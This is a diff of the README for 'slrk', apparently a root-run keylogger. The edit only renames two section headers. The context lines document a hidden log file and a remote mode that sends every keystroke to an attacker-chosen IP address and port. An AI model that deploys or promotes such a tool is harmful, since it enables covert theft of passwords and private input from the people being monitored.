@@ -10,7 +10,7 @@
 - It works with both TCP and UDP and with ipv6 too.
 - It must be run as root.
 
-##USAGE:
+##SYNOPSIS:
 ```
 #./slrk [OPTIONS]
 ```
@@ -20,7 +20,7 @@
 -o <output-file>:			It can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt'
 -m remote -a <IP-ADDR> -p <PORT>:	It sends all the keystrokes on the remote server located at <IP-ADDR:PORT>
 ```
-##EXAMPLE:
+##EXAMPLES:
 
 - TCP:
 ```
